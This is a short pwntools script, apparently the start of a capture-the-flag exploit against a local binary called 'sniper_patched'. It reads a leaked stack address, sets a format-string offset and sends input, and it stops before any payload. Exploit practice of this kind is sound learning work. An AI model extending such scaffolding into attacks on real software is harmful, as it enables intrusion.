from pwn import *
import time
exe = context.binary = ELF("./sniper_patched")
r = process()
offset = 6
# r.recvuntil(b"")
leak_stack = int(r.recvline().strip().decode(),16)
log.info(f"Leak stack {hex(leak_stack)}")
time.sleep(10)
r.sendline("1")